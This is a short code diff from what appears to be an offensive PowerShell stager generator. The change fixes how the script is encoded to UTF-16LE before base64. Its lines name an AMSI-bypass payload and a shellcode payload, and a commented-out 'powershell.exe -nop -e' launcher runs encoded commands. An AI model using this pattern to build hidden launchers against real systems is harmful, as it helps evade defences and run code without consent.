@@ -87,7 +87,7 @@ def main(argv):
     script = script.replace(b"PORT_WEBSERV", port.encode())
     script = script.replace(b"PAYLOAD_AMSI", b"payloadAmsi.ps1")
     script = script.replace(b"PAYLOAD_SHELLCODE", b"payloadShellcode.ps1")
-    script_utf16 = bytearray(script.decode("utf-8"), 'utf-16')
+    script_utf16 = script.decode("utf-8").encode("utf_16_le")
     base64_bytes = base64.b64encode(script_utf16)
 
 #     oneLiner = "powershell.exe -nop -e {}".format(base64_bytes.decode("utf-8"))
